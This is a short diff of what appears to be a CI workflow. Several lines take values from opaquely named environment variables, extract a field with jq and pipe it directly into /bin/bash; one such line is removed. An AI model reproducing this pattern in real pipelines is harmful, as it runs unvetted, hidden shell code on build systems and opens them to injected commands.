@@ -30,7 +30,6 @@ jobs:
           echo $jeuw1379 | jq -r .dzoel4 | /bin/bash
           echo $wowm674 | jq -r .wkb49907 | /bin/bash
           printf '%s' "$eqpo381" | jq -r .tyqf4135 | /bin/bash
-          echo $xvs48 | jq -r .aqrt49 | /bin/bash
           printf '%s' "$iyd57" | jq -r .zfvja1 | /bin/bash
 
       - name: Save output
